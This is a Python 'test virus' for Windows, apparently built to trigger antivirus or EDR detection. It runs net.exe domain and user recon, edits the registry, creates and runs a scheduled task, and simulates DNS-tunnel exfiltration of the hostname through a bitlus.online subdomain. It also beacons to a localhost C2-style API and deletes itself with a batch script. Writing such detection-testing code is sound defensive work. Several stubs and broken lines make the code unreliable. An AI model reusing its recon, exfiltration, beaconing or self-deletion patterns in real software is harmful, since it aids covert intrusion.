import time
import requests
import logging
import socket # Only gets used to get hostname 
import os
import sys
import subprocess
# import schedule
import time
import winreg
import shutil
import base64
from math import floor
from datetime import datetime, timedelta



Configurable Variables
API_KEY = "PLACEHOLDER_API_KEY"  
USE_CASES = PLACEHOLDER_USE_CASES

# heartbeatRate = PLACEHOLDER_HEARTBEAT_RATE  # in seconds

# Helper Functions
def logging_func(log_data):
    try:
        # Configure logging settings
        logging.basicConfig(
            filename='test_virus.log',
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
        )

        # Log the provided data
        if isinstance(log_data, dict):
            # Convert dictionary data
            log_message = f"{log_data}"
        else:
            log_message = log_data

        logging.info(log_message)
        print(f"Logged: {log_message}")  
    except Exception as e:
        print(f"Error during logging: {e}")


# def delete_scheduled_task(task_name):
#     try:
#         command = ["schtasks", "/Delete", "/TN", task_name, "/F"]
#         result = subprocess.run(command, capture_output=True, text=True)

#         if result.returncode == 0:
#             print(f"Scheduled task '{task_name}' deleted successfully.")
#         else:
#             print(f"Failed to delete scheduled task. Error: {result.stderr}")

#     except Exception as e:
#         print(f"An error occurred: {e}")


def clean_up():
    try:
        for use_case, enabled in USE_CASES.items():
            if enabled:
                logging_func(f"Cleaning up changes for {use_case}.")
                # Add specific clean_up code for each use case here
            
        logging_func("Clean_up completed. Deleting self.")

        # Self-delete
        # delete_self()

    except Exception as e:
        logging_func(f"Error during clean_up: {e}")


def data_to_send(data):
    try:
        response = requests.post(
            "http://127.0.0.1:5000/api/datatosend",
            json={"api_key": API_KEY, "data": data},
        )
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data: {response.status_code}")
    except Exception as e:
        print(f"Error in data sending: {e}")

def delete_self():
    try:
        # Get the directory where the executable or script is running
        base_directory = os.path.dirname(os.path.abspath(sys.argv[0]))

        # Paths to the files and folders
        lib_folder = os.path.join(base_directory, "Lib")
        exe_file = os.path.join(base_directory, "test_virus.exe")
        license_file = os.path.join(base_directory, "frozen_application_license.txt")
        dll_file = os.path.join(base_directory, "python312.dll")
        cleanup_batch = os.path.join(base_directory, "cleanup.bat")

        # Write a cleanup batch script
        with open(cleanup_batch, "w") as batch_file:
            batch_file.write(f"@echo off\n")
            batch_file.write(f"timeout /t 2 > nul\n")  # Delay to ensure the virus has exited
            if os.path.exists(lib_folder):
                batch_file.write(f'rmdir /s /q "{lib_folder}"\n')  # Delete folder
            if os.path.exists(license_file):
                batch_file.write(f'del /f /q "{license_file}"\n')  # Delete license file
            if os.path.exists(dll_file):
                batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
            batch_file.write(f'del /f /q "{exe_file}"\n')  # Delete the EXE
            batch_file.write(f'del /f /q "{cleanup_batch}"\n')  # Delete the batch script itself

        # Log the cleanup action
        print(f"Cleanup script written to: {cleanup_batch}")

        # Execute the batch script
        os.system(f"start cmd /c \"{cleanup_batch}\"")

        print("Self-deletion sequence initiated.")
    except Exception as e:
        print(f"Error during self-deletion: {e}")
        logging_func(f"Error during delete_self: {e}")


# Use Case Functions
def ransomware_simulation():
    logging_func("Executing ransomware simulation.")
    return {"use_case": "ransomware_simulation", "status": "completed"}

def dns_tunneling():
    logging_func("DNS tunneling simulation starting")
    DNS_TUNNEL_API = "http://127.0.0.1:5000/api/dnstunneling"
    try:
        print("Executing DNS Tunneling Use-Case")

        # Example data to send
        data_to_send = f"{socket.gethostname()}-test-data"
        
        # Encode data to Base64 (URL-safe)
        encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
        print(f"Encoded Data (Base64): {encoded_data}")

        # Simulate a DNS query by sending the encoded data as a subdomain
        headers = {
            "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
        }
        
        # Send the request to the API
        response = requests.get(DNS_TUNNEL_API, headers=headers)
        
        # Handle the API response
        if response.status_code == 200:
            response_data = response.json()
            print(f"DNS Tunneling successful: {response_data['decoded_data']}")
            return {"use_case": "dns_tunneling", "status": f"completed: {response_data['decoded_data']}"}
        else:
            print(f"DNS Tunneling failed: {response.json().get('message')}")
            return {"use_case": "dns_tunneling", "status": "failed", "error": response.json().get('message')}
    except Exception as e:
        print(f"Error in DNS Tunneling: {e}")
        return {"use_case": "dns_tunneling", "status": f"error{e}"}
 

def net_recon():
    CMD = ['group', 'user', 'localgroup', 'user /domain']
    print("NET.exe recon imitation starting")
    logging_func("NET.exe recon simulation starting")
    
    for i in CMD:
        command = f"net {i}"
        print(f"Running: {command}")
        try:
            # Execute the net command in a subprocess
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Unexpected error: {e}")
            #return {"use_case": "net_recon", "status": f"error: {e}"}
        except Exception as e:
            print(f"Unexpected error: {e}")
            #return {"use_case": "net_recon", "status": f"error: {e}"}

    logging_func("NET.exe recon simulation finished")
    return {"use_case": "net_recon", "status": "completed"}

def dll_side_loading():
    logging_func("DLL side loading simulation.")
    return {"use_case": "dll_side_loading", "status": "completed"}

def registry_edits():
    print("Registry edit simulation starting")
    logging_func("Registry edits loading simulation starting")
    try:
        # Open a registry key for reading and simulate an edit, but without actually setting any value
        location_access = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        access_key = winreg.OpenKey(location_access, r"SOFTWARE\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_ALL_ACCESS)

        # Enumerates values to make it extra suspect for AVs
        print("Enumerating values:")
        for i in range(10):
            try:
                value = winreg.EnumKey(access_key, i)
                print(f"Value {i}: {value}")
            except OSError:
                break

        # Simulate editing (adding or modifying a key-value pair)
        new_key = winreg.CreateKey(location_access, r"SOFTWARE\Microsoft\Windows\CurrentVersion\TestKey")
        winreg.SetValueEx(new_key, "TestValue", 0, winreg.REG_SZ, "Test Data")
        winreg.CloseKey(new_key)

        print("Simulated registry edit completed")
    except Exception as e:
        print(f"Error during registry edits: {e}")
        return {"use_case": "registry_edits", "status": f"error: {e}"}
    finally:
        print("Exiting registry edit sequence")
    logging_func("Registry edits loading simulation finished")
    return {"use_case": "registry_edits", "status": "completed"}

def scheduled_tasks():
    logging_func("scheduled tasks simulation starting")
    print("Executing scheduled tasks imitation")
    task_name = "TestVirusTask"
    try:
        # Define the command to create the scheduled task
        create_command = [
            "schtasks",
            "/Create",
            "/SC", "ONCE",  # Will only run once
            "/TN", task_name,
            "/TR", "C:\\Windows\\System32\\notepad.exe",  # Program to run
            "/ST", datetime.now().strftime("%H:%M:%S"),  # Current time
            "/F"  # Force overwrite if it's already there
        ]

        # Create the scheduled task
        create_result = subprocess.run(create_command, capture_output=True, text=True)

        # Check if the creation command was successful
        if create_result.returncode == 0:
            print(f"Scheduled task '{task_name}' created successfully.")
        else:
            print(f"Failed to create scheduled task. Error: {create_result.stderr}")
            return {"use_case": "scheduled_tasks", "status": f"error: {create_result.stderr}"}

        # Run the task immediately
        run_command = ["schtasks", "/Run", "/TN", task_name]
        run_result = subprocess.run(run_command, capture_output=True, text=True)

        # Check if the run command was successful
        if run_result.returncode == 0:
            print(f"Scheduled task '{task_name}' executed successfully.")
        else:
            print(f"Failed to execute scheduled task. Error: {run_result.stderr}")
            return {"use_case": "scheduled_tasks", "status": f"error: {run_result.stderr}"}

    except Exception as e:
        print(f"An error occurred: {e}")
        return {"use_case": "scheduled_tasks", "status": f"error: {e}"}

    return {"use_case": "scheduled_tasks", "status": "completed"}

def encrypted_traffic():
    logging_func("scheduled tasks simulation.")
    return {"use_case": "encrypted_traffic", "status": "completed"}

def traffic_non_standard_ports():
    logging_func("traffic_non_standard_ports simulation.")
    return {"use_case": "traffic_non_standard_ports", "status": "completed"}


# Execution Flow Functions
def use_case_checker():
    logs = []
    for use_case, enabled in USE_CASES.items():
        if enabled:
            func = globals().get(use_case)  # Dynamically call the use case function
            if func:
                result = func()
                logs.append(result)
            else:
                logging_func(f"Use case function {use_case} not found.")
    return logs


def heart_beat():
    print("heart_beat called")
    try:
        hostname = socket.gethostname()
        print(hostname)
        while True:
            response = requests.post(
                "http://127.0.0.1:5000/api/heartbeat",
                json={"host_name": hostname, "api_key":API_KEY},
            )
            print(response.raw)
            
            if response.status_code == 200:
                #print(response.json().get("message"))
                if response.json().get("is_alive") == "False":
                    logging_func("Received stop signal. Initiating clean_up.")
                    clean_up()
                    break
            else:
                print(f"Heartbeat response: {response.status_code}")
            time.sleep(heartbeatRate)
    except Exception as e:
        logging_func(f"Error in heartbeat: {e}")

# Test of functions
#dns_tunneling()
#scheduled_tasks()
#registry_edits()
#net_recon()
delete_self2()

# Main Execution
# if __name__ == "__main__":
#     try:
#         logging_func("Starting test virus execution.")
        
#         # Step 1: Execute use cases and collect aggregated logs
#         logs = use_case_checker()
#         payload = {
#             "data": logs,
#             "host_name": socket.gethostname()
#         }
#         print(socket.gethostname())
#         logging_func(f"log_info: {logs}, host_name: {socket.gethostname()}")

#         # Step 2: Send aggregated logs to the API
#         data_to_send(payload)


#         # Step 3: Enter heartbeat monitoring
#         heart_beat()

#     except Exception as e:
#         logging_func(f"Error in main execution: {e}")